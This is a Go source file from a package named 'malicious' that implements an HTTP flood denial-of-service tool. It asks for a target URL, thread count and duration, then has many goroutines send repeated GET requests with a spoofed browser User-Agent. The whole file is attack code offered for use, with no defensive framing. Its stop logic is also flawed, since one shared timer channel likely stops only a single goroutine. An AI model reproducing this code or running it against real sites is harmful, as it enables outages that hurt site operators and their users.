package malicious

import (
    "fmt"
    "net/http"
    "sync"
    "time"

    "ghosttools/internal/ui"
)

func DDoS() {
    ui.Cyan("enter target URL:")
    var url string
    fmt.Scanln(&url)
    ui.Cyan("threads (default 100):")
    var threads int
    fmt.Scanln(&threads)
    if threads == 0 {
        threads = 100
    }
    ui.Cyan("duration seconds (default 30):")
    var dur int
    fmt.Scanln(&dur)
    if dur == 0 {
        dur = 30
    }

    var wg sync.WaitGroup
    client := &http.Client{Timeout: 5 * time.Second}
    stop := time.After(time.Duration(dur) * time.Second)

    for i := 0; i < threads; i++ {
        wg.Add(1)
        go func() {
            defer wg.Done()
            for {
                select {
                case <-stop:
                    return
                default:
                    req, _ := http.NewRequest("GET", url, nil)
                    req.Header.Set("User-Agent", "Mozilla/5.0")
                    resp, err := client.Do(req)
                    if err == nil {
                        resp.Body.Close()
                    }
                }
            }
        }()
    }
    ui.Yellow(fmt.Sprintf("flooding %s with %d threads for %ds...", url, threads, dur))
    wg.Wait()
    ui.Green("done.")
}